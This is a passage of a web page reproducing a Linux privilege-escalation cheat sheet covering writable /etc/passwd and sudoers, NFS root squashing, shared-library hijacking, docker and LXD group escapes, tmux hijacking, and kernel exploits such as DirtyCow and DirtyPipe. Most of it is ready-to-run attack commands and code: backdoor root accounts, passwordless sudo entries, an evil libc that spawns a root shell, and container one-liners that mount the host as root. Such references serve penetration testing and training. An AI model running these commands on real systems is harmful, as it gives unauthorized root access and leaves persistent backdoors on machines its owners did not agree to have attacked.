</span></span><span style=display:flex><span>mkpasswd -m SHA-<span style=color:#ae81ff>512</span> hacker
</span></span><span style=display:flex><span>python2 -c <span style=color:#e6db74>&#39;import crypt; print crypt.crypt(&#34;hacker&#34;, &#34;$6$salt&#34;)&#39;</span>
</span></span></code></pre></div><p>Then add the user <code>hacker</code> and add the generated password.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>hacker<span style=color:#960050;background-color:#1e0010>:</span>GENERATED_PASSWORD_HERE<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>0</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>0</span><span style=color:#960050;background-color:#1e0010>:</span>Hacker<span style=color:#960050;background-color:#1e0010>:</span>/root<span style=color:#960050;background-color:#1e0010>:</span>/bin/bash
</span></span></code></pre></div><p>E.g: <code>hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash</code></p><p>You can now use the <code>su</code> command with <code>hacker:hacker</code></p><p>Alternatively you can use the following lines to add a dummy user without a password.<br>WARNING: you might degrade the current security of the machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>echo <span style=color:#e6db74>&#39;dummy::0:0::/root:/bin/bash&#39;</span> &gt;&gt;/etc/passwd
</span></span><span style=display:flex><span>su - dummy
</span></span></code></pre></div><p>NOTE: In BSD platforms <code>/etc/passwd</code> is located at <code>/etc/pwd.db</code> and <code>/etc/master.passwd</code>, also the <code>/etc/shadow</code> is renamed to <code>/etc/spwd.db</code>.</p><h3 id=writable-etcsudoers>Writable /etc/sudoers
<a class=anchor href=#writable-etcsudoers>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>echo <span style=color:#e6db74>&#34;username ALL=(ALL:ALL) ALL&#34;</span>&gt;&gt;/etc/sudoers
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># use SUDO without password</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;username ALL=(ALL) NOPASSWD: ALL&#34;</span> &gt;&gt;/etc/sudoers
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;username ALL=NOPASSWD: /bin/bash&#34;</span> &gt;&gt;/etc/sudoers
</span></span></code></pre></div><h2 id=nfs-root-squashing>NFS Root Squashing
<a class=anchor href=#nfs-root-squashing>#</a></h2><p>When <strong>no_root_squash</strong> appears in <code>/etc/exports</code>, the folder is shareable and a remote user can mount it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># remote check the name of the folder</span>
</span></span><span style=display:flex><span>showmount -e <span style=color:#ae81ff>10.10</span>.10.10
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># create dir</span>
</span></span><span style=display:flex><span>mkdir /tmp/nfsdir  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># mount directory </span>
</span></span><span style=display:flex><span>mount -t nfs <span style=color:#ae81ff>10.10</span>.10.<span style=color:#ae81ff>10</span><span style=color:#960050;background-color:#1e0010>:</span>/shared /tmp/nfsdir    
</span></span><span style=display:flex><span>cd /tmp/nfsdir
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># copy wanted shell </span>
</span></span><span style=display:flex><span>cp /bin/bash . 	
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># set suid permission</span>
</span></span><span style=display:flex><span>chmod +s bash 	
</span></span></code></pre></div><h2 id=shared-library>Shared Library
<a class=anchor href=#shared-library>#</a></h2><h3 id=ldconfig>ldconfig
<a class=anchor href=#ldconfig>#</a></h3><p>Identify shared libraries with <code>ldd</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$ ldd /opt/binary
</span></span><span style=display:flex><span>    linux-vdso.so.1 (0x00007ffe961cd000)
</span></span><span style=display:flex><span>    vulnlib.so.8 =&gt; /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
</span></span><span style=display:flex><span>    /lib64/ld-linux-x86-<span style=color:#ae81ff>64</span>.so.2 =&gt; /usr/lib64/ld-linux-x86-<span style=color:#ae81ff>64</span>.so.2 (0x00007fa55e6c8000)        
</span></span></code></pre></div><p>Create a library in <code>/tmp</code> and activate the path.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>gcc <span style=color:#960050;background-color:#1e0010>–</span>Wall <span style=color:#960050;background-color:#1e0010>–</span>fPIC <span style=color:#960050;background-color:#1e0010>–</span>shared <span style=color:#960050;background-color:#1e0010>–</span>o vulnlib.so /tmp/vulnlib.c
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;/tmp/&#34;</span> &gt; /etc/ld.so.conf.d/exploit.conf &amp;&amp; ldconfig -l /tmp/vulnlib.so
</span></span><span style=display:flex><span>/opt/binary
</span></span></code></pre></div><h3 id=rpath>RPATH
<a class=anchor href=#rpath>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>level15@nebula<span style=color:#960050;background-color:#1e0010>:</span>/home/flag15$ readelf -d flag15 | egrep <span style=color:#e6db74>&#34;NEEDED|RPATH&#34;</span>
</span></span><span style=display:flex><span> 0x00000001 (NEEDED)                     Shared library<span style=color:#960050;background-color:#1e0010>:</span> [<span style=color:#66d9ef>libc.so.6</span>]
</span></span><span style=display:flex><span> 0x0000000f (RPATH)                      Library rpath<span style=color:#960050;background-color:#1e0010>:</span> [/var/tmp/flag15]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>level15@nebula<span style=color:#960050;background-color:#1e0010>:</span>/home/flag15$ ldd ./flag15 
</span></span><span style=display:flex><span> linux-gate.so.1 =&gt;  (0x0068c000)
</span></span><span style=display:flex><span> libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x00110000)
</span></span><span style=display:flex><span> /lib/ld-linux.so.2 (0x005bb000)
</span></span></code></pre></div><p>By copying the lib into <code>/var/tmp/flag15/</code> it will be used by the program in this place as specified in the <code>RPATH</code> variable.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>level15@nebula<span style=color:#960050;background-color:#1e0010>:</span>/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>level15@nebula<span style=color:#960050;background-color:#1e0010>:</span>/home/flag15$ ldd ./flag15 
</span></span><span style=display:flex><span> linux-gate.so.1 =&gt;  (0x005b0000)
</span></span><span style=display:flex><span> libc.so.6 =&gt; /var/tmp/flag15/libc.so.6 (0x00110000)
</span></span><span style=display:flex><span> /lib/ld-linux.so.2 (0x00737000)
</span></span></code></pre></div><p>Then create an evil library in <code>/var/tmp</code> with <code>gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e>#include&lt;stdlib.h&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define SHELL &#34;/bin/sh&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span> char *file = SHELL;
</span></span><span style=display:flex><span> char *argv[] = {SHELL,<span style=color:#ae81ff>0</span>};
</span></span><span style=display:flex><span> setresuid(geteuid(),geteuid(), geteuid());
</span></span><span style=display:flex><span> execve(file,argv,<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=groups>Groups
<a class=anchor href=#groups>#</a></h2><h3 id=docker>Docker
<a class=anchor href=#docker>#</a></h3><p>Mount the filesystem in a bash container, allowing you to edit the <code>/etc/passwd</code> as root, then add a backdoor account <code>toor:password</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$&gt; docker run -it --rm -v $PWD:/mnt bash
</span></span><span style=display:flex><span>$&gt; echo <span style=color:#e6db74>&#39;toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh&#39;</span> &gt;&gt; /mnt/etc/passwd
</span></span></code></pre></div><p>Almost similar but you will also see all processes running on the host and be connected to the same NICs.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>docker run --rm -it --pid=host --net=host --privileged -v /<span style=color:#960050;background-color:#1e0010>:</span>/host ubuntu bash
</span></span></code></pre></div><p>Or use the following docker image from <a href=https://hub.docker.com/r/chrisfosterelli/rootplease/>chrisfosterelli</a> to spawn a root shell</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$ docker run -v /<span style=color:#960050;background-color:#1e0010>:</span>/hostOS -i -t chrisfosterelli/rootplease
</span></span><span style=display:flex><span>latest<span style=color:#960050;background-color:#1e0010>:</span> Pulling from chrisfosterelli/rootplease
</span></span><span style=display:flex><span>2de59b831a23<span style=color:#960050;background-color:#1e0010>:</span> Pull complete 
</span></span><span style=display:flex><span>354c3661655e<span style=color:#960050;background-color:#1e0010>:</span> Pull complete 
</span></span><span style=display:flex><span>91930878a2d7<span style=color:#960050;background-color:#1e0010>:</span> Pull complete 
</span></span><span style=display:flex><span>a3ed95caeb02<span style=color:#960050;background-color:#1e0010>:</span> Pull complete 
</span></span><span style=display:flex><span>489b110c54dc<span style=color:#960050;background-color:#1e0010>:</span> Pull complete 
</span></span><span style=display:flex><span>Digest<span style=color:#960050;background-color:#1e0010>:</span> sha256<span style=color:#960050;background-color:#1e0010>:</span>07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
</span></span><span style=display:flex><span>Status<span style=color:#960050;background-color:#1e0010>:</span> Downloaded newer image <span style=color:#66d9ef>for</span> chrisfosterelli/rootplease<span style=color:#960050;background-color:#1e0010>:</span>latest
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>You should now have a root shell on the host OS
</span></span><span style=display:flex><span>Press Ctrl-D to exit the docker instance / shell
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh-<span style=color:#ae81ff>5.0</span><span style=color:#75715e># id</span>
</span></span><span style=display:flex><span>uid=<span style=color:#ae81ff>0</span>(root) gid=<span style=color:#ae81ff>0</span>(root) groups=<span style=color:#ae81ff>0</span>(root)
</span></span></code></pre></div><p>More docker privilege escalation using the Docker Socket.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>sudo docker -H unix<span style=color:#960050;background-color:#1e0010>:</span>///google/host/var/run/docker.sock run -v /<span style=color:#960050;background-color:#1e0010>:</span>/host -it ubuntu chroot /host /bin/bash
</span></span><span style=display:flex><span>sudo docker -H unix<span style=color:#960050;background-color:#1e0010>:</span>///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t <span style=color:#ae81ff>1</span> -m -u -n -i sh
</span></span></code></pre></div><h3 id=lxclxd>LXC/LXD
<a class=anchor href=#lxclxd>#</a></h3><p>The privesc requires to run a container with elevated privileges and mount the host filesystem inside.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>╭─</span>swissky@lab ~  
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>╰─</span>$ id
</span></span><span style=display:flex><span>uid=<span style=color:#ae81ff>1000</span>(swissky) gid=<span style=color:#ae81ff>1000</span>(swissky) groupes=<span style=color:#ae81ff>1000</span>(swissky),<span style=color:#ae81ff>3</span>(sys),<span style=color:#ae81ff>90</span>(network),<span style=color:#ae81ff>98</span>(power),<span style=color:#ae81ff>110</span>(lxd),<span style=color:#ae81ff>991</span>(lp),<span style=color:#ae81ff>998</span>(wheel)
</span></span></code></pre></div><p>Build an Alpine image and start it using the flag <code>security.privileged=true</code>, forcing the container to interact as root with the host filesystem.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># build a simple alpine image</span>
</span></span><span style=display:flex><span>git clone https<span style=color:#960050;background-color:#1e0010>:</span>//github.com/saghul/lxd-alpine-builder
</span></span><span style=display:flex><span>./build-alpine -a i686
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># import the image</span>
</span></span><span style=display:flex><span>lxc image import ./alpine.tar.gz --alias myimage
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># run the image</span>
</span></span><span style=display:flex><span>lxc init myimage mycontainer -c security.privileged=true
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># mount the /root into the image</span>
</span></span><span style=display:flex><span>lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># interact with the container</span>
</span></span><span style=display:flex><span>lxc start mycontainer
</span></span><span style=display:flex><span>lxc exec mycontainer /bin/sh
</span></span></code></pre></div><p>Alternatively <a href=https://github.com/initstring/lxd_root>https://github.com/initstring/lxd_root</a></p><h2 id=hijack-tmux-session>Hijack TMUX session
<a class=anchor href=#hijack-tmux-session>#</a></h2><p>Require a read access to the tmux socket : <code>/tmp/tmux-1000/default</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>export TMUX=/tmp/tmux-<span style=color:#ae81ff>1000</span>/<span style=color:#66d9ef>default</span>,<span style=color:#ae81ff>1234</span>,<span style=color:#ae81ff>0</span> 
</span></span><span style=display:flex><span>tmux ls
</span></span></code></pre></div><h2 id=kernel-exploits>Kernel Exploits
<a class=anchor href=#kernel-exploits>#</a></h2><p>Precompiled exploits can be found inside these repositories, run them at your own risk !</p><ul><li><a href=https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits>bin-sploits - @offensive-security</a></li><li><a href=https://github.com/lucyoa/kernel-exploits/>kernel-exploits - @lucyoa</a></li></ul><p>The following exploits are known to work well, search for more exploits with <code>searchsploit -w linux kernel centos</code>.</p><p>Another way to find a kernel exploit is to get the specific kernel version and linux distro of the machine by doing <code>uname -a</code>
Copy the kernel version and distribution, and search for it in google or in <a href=https://www.exploit-db.com/>https://www.exploit-db.com/</a>.</p><h3 id=cve-2022-0847-dirtypipe>CVE-2022-0847 (DirtyPipe)
<a class=anchor href=#cve-2022-0847-dirtypipe>#</a></h3><p>Linux Privilege Escalation - Linux Kernel 5.8 &lt; 5.16.11</p><pre tabindex=0><code>https://www.exploit-db.com/exploits/50808
</code></pre><h3 id=cve-2016-5195-dirtycow>CVE-2016-5195 (DirtyCow)
<a class=anchor href=#cve-2016-5195-dirtycow>#</a></h3><p>Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># make dirtycow stable</span>
</span></span><span style=display:flex><span>echo <span style=color:#ae81ff>0</span> &gt; /proc/sys/vm/dirty_writeback_centisecs
</span></span><span style=display:flex><span>g++ -Wall -pedantic -O2 -std=c+<span style=color:#ae81ff>+11</span> -pthread -o dcow <span style=color:#ae81ff>40847</span>.cpp -lutil
</span></span><span style=display:flex><span>https<span style=color:#960050;background-color:#1e0010>:</span>//github.com/dirtycow/dirtycow.github.io/wiki/PoCs
</span></span><span style=display:flex><span>https<span style=color:#960050;background-color:#1e0010>:</span>//github.com/evait-security/ClickNRoot/blob/master/<span style=color:#ae81ff>1</span>/exploit.c
</span></span></code></pre></div><h3 id=cve-2010-3904-rds>CVE-2010-3904 (RDS)
<a class=anchor href=#cve-2010-3904-rds>#</a></h3><p>Linux RDS Exploit - Linux Kernel &lt;= 2.6.36-rc8</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>https<span style=color:#960050;background-color:#1e0010>:</span>//www.exploit-db.com/exploits/<span style=color:#ae81ff>15285</span>/
</span></span></code></pre></div><h3 id=cve-2010-4258-full-nelson>CVE-2010-4258 (Full Nelson)
<a class=anchor href=#cve-2010-4258-full-nelson>#</a></h3><p>Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>https<span style=color:#960050;background-color:#1e0010>:</span>//www.exploit-db.com/exploits/<span style=color:#ae81ff>15704</span>/
</span></span></code></pre></div><h3 id=cve-2012-0056-mempodipper>CVE-2012-0056 (Mempodipper)
<a class=anchor href=#cve-2012-0056-mempodipper>#</a></h3><p>Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>https<span style=color:#960050;background-color:#1e0010>:</span>//www.exploit-db.com/exploits/<span style=color:#ae81ff>18411</span>
</span></span></code></pre></div><h2 id=references>References
<a class=anchor href=#references>#</a></h2><ul><li><a href=https://mn3m.info/posts/suid-vs-capabilities/>SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m</a></li><li><a href=https://fosterelli.co/privilege-escalation-via-docker.html>Privilege escalation via Docker - April 22, 2015 - Chris Foster</a></li><li><a href=https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/>An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018</a></li><li><a href=https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/>Exploiting wildcards on Linux - Berislav Kucan</a></li><li><a href=http://p4pentest.in/2016/10/19/code-execution-with-tar-command/>Code Execution With Tar Command - p4pentest</a></li><li><a href=http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt>Back To The Future: Unix Wildcards Gone Wild - Leon Juranic</a></li><li><a href=https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/>HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018</a></li><li><a href=https://reboare.github.io/lxd/lxd-escape.html>Privilege Escalation via lxd - @reboare</a></li><li><a href=https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/>Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018</a></li><li><a href=https://github.com/nongiach/sudo_inject>Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc</a></li></ul><ul><li><a href=http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html>Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates</a></li><li><a href=https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf>Local Privilege Escalation Workshop - Slides.pdf - @sagishahar</a></li><li><a href=https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/SSH/key-exploit.md>SSH Key Predictable PRNG (Authorized_Keys) Process - @weaknetlabs</a></li><li><a href=https://dirtypipe.cm4all.com/>The Dirty Pipe Vulnerability</a></li></ul></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div><a class="flex align-center" href=https://github.com/m00tiny/grayhatfreelancing/commit/75f0a66614fa426f8abba2c6d831f05bf85bfab5 title='Last modified by Stuart Gray | January 27, 2023' target=_blank rel=noopener><img src=/svg/calendar.svg class=book-icon alt=Calendar>
<span>January 27, 2023</span></a></div></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#linux---privilege-escalation>Linux - Privilege Escalation</a><ul><li><a href=#tools>Tools</a></li><li><a href=#checklists>Checklists</a></li><li><a href=#looting-for-passwords>Looting for passwords</a><ul><li><a href=#files-containing-passwords>Files containing passwords</a></li><li><a href=#old-passwords-in-etcsecurityopasswd>Old passwords in /etc/security/opasswd</a></li><li><a href=#last-edited-files>Last edited files</a></li><li><a href=#in-memory-passwords>In memory passwords</a></li><li><a href=#find-sensitive-files>Find sensitive files</a></li></ul></li><li><a href=#ssh-key>SSH Key</a><ul><li><a href=#sensitive-files>Sensitive files</a></li><li><a href=#ssh-key-predictable-prng-authorized_keys-process>SSH Key Predictable PRNG (Authorized_Keys) Process</a></li></ul></li><li><a href=#scheduled-tasks>Scheduled tasks</a><ul><li><a href=#cron-jobs>Cron jobs</a></li></ul></li><li><a href=#systemd-timers>Systemd timers</a></li><li><a href=#suid>SUID</a><ul><li><a href=#find-suid-binaries>Find SUID binaries</a></li><li><a href=#create-a-suid-binary>Create a SUID binary</a></li></ul></li><li><a href=#capabilities>Capabilities</a><ul><li><a href=#list-capabilities-of-binaries>List capabilities of binaries</a></li><li><a href=#edit-capabilities>Edit capabilities</a></li><li><a href=#interesting-capabilities>Interesting capabilities</a></li></ul></li><li><a href=#sudo>SUDO</a><ul><li><a href=#nopasswd>NOPASSWD</a></li><li><a href=#ld_preload-and-nopasswd>LD_PRELOAD and NOPASSWD</a></li><li><a href=#doas>Doas</a></li><li><a href=#sudo_inject>sudo_inject</a></li><li><a href=#cve-2019-14287>CVE-2019-14287</a></li></ul></li><li><a href=#gtfobins>GTFOBins</a></li><li><a href=#wildcard>Wildcard</a></li><li><a href=#writable-files>Writable files</a><ul><li><a href=#writable-etcsysconfignetwork-scripts-centosredhat>Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)</a></li><li><a href=#writable-etcpasswd>Writable /etc/passwd</a></li><li><a href=#writable-etcsudoers>Writable /etc/sudoers</a></li></ul></li><li><a href=#nfs-root-squashing>NFS Root Squashing</a></li><li><a href=#shared-library>Shared Library</a><ul><li><a href=#ldconfig>ldconfig</a></li><li><a href=#rpath>RPATH</a></li></ul></li><li><a href=#groups>Groups</a><ul><li><a href=#docker>Docker</a></li><li><a href=#lxclxd>LXC/LXD</a></li></ul></li><li><a href=#hijack-tmux-session>Hijack TMUX session</a></li><li><a href=#kernel-exploits>Kernel Exploits</a><ul><li><a href=#cve-2022-0847-dirtypipe>CVE-2022-0847 (DirtyPipe)</a></li><li><a href=#cve-2016-5195-dirtycow>CVE-2016-5195 (DirtyCow)</a></li><li><a href=#cve-2010-3904-rds>CVE-2010-3904 (RDS)</a></li><li><a href=#cve-2010-4258-full-nelson>CVE-2010-4258 (Full Nelson)</a></li><li><a href=#cve-2012-0056-mempodipper>CVE-2012-0056 (Mempodipper)</a></li></ul></li><li><a href=#references>References</a></li></ul></li></ul></nav></div></aside></main></body></html>